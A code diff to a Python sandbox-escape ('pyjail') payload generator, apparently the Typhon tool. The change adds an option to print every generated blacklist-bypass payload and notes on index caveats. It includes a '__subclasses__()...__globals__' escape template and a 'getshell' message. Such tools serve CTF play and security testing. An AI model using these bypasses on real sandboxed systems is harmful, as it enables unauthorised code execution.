@@ -56,6 +56,7 @@ def bypassMAIN(local_scope: Dict[str, Any] = {},
            max_length: int = None,
            allow_unicode_bypass: bool = False,
            depth: int = 20,
+           print_all_payload: bool = False,
            log_level: str = 'INFO') -> None:
     '''
     This is the main function of the Typhon package.
@@ -69,10 +70,12 @@ def bypassMAIN(local_scope: Dict[str, Any] = {},
     :param banned_re: is a banned regex.
     :param allow_unicode_bypass: if unicode bypasses are allowed.
     :param depth: is the depth that combined bypassing being generarted
+    :param print_all_payload: if all payloads should be printed.
     :param log_level: is the logging level, default is INFO, change it to
     DEBUG for more details.
     '''
-    global achivements, log_level_, generated_path, search_depth, tagged_scope, try_to_restore
+    global achivements, log_level_, generated_path, search_depth, tagged_scope, try_to_restore, reminder
+    reminder = {} # The reminder of bypass method that could not be used in remote (like coherence chain)
     search_depth = depth # The maximum search depth for combined bypassing
     if local_scope == {}:
         # If the local scope is not specified, raise a warning.
@@ -128,7 +131,10 @@ Try to bypass blacklist with them. Please be paitent.', len(path), data_name)
                 if success:
                     logger.info('[+] Success. %d payload(s) in total.', len(_))
                     logger.debug(f'[*] payloads: {_}')
-                    if end_of_prog: bypasses_output(i)
+                    if end_of_prog: 
+                        if print_all_payload:
+                            bypasses_output(_)
+                        bypasses_output(i)
                 else:
                     achivements[data_name] = ['None', 0]
                     logger.info('[-] no way to bypass blacklist to obtain %s.', data_name)
@@ -166,6 +172,8 @@ Try to bypass blacklist with them. Please be paitent.', len(simple_path))
             logger.debug(_)
             logger.info('[+] You now can use this payload to getshell directly with proper input.')
             achivements['directly input bypass'] = [_[0], len(_)]
+            if print_all_payload:
+                bypasses_output(_)
             bypasses_output(_[0])
         else:
             achivements['directly input bypass'] = ['None', 0]
@@ -299,7 +307,9 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
                         object_path = generated_path['OBJECT']
                         payload = f'{object_path}.__subclasses__()[{index}].__init__.__globals__["{j}"]'
                         for _ in BypassGenerator(payload, allow_unicode_bypass=allow_unicode_bypass).generate_bypasses():
-                            if not is_blacklisted(_, banned_chr, banned_ast, banned_re, max_length): search[j].append(_)
+                            if not is_blacklisted(_, banned_chr, banned_ast, banned_re, max_length):
+                                search[j].append(_)
+                                reminder[_] = f'for now, {index} is the index of {i.__name__}, {j} must fit in index of {i.__name__}'
                             continue
             except AttributeError:
                 pass
@@ -344,6 +354,7 @@ def bypassRCE(
     max_length:int=1000,
     allow_unicode_bypass:bool=False,
     depth:int=20,
+    print_all_payload:bool=False,
     log_level:str='INFO'
 ):
     """
@@ -357,6 +368,7 @@ def bypassRCE(
     :param max_length: is the maximum length of the payload.
     :param allow_unicode_bypass: if unicode bypasses are allowed.
     :param depth: is the depth that combined bypassing being generarted
+    :param print_all_payload: if all payloads should be printed.
     :param log_level: is the logging level, default is INFO, change it to
     DEBUG for more details.
     """
@@ -368,5 +380,6 @@ def bypassRCE(
                            max_length=max_length,
                            allow_unicode_bypass=allow_unicode_bypass,
                            depth=depth,
+                           print_all_payload=print_all_payload,
                            log_level=log_level)
     print(tagged_scope)
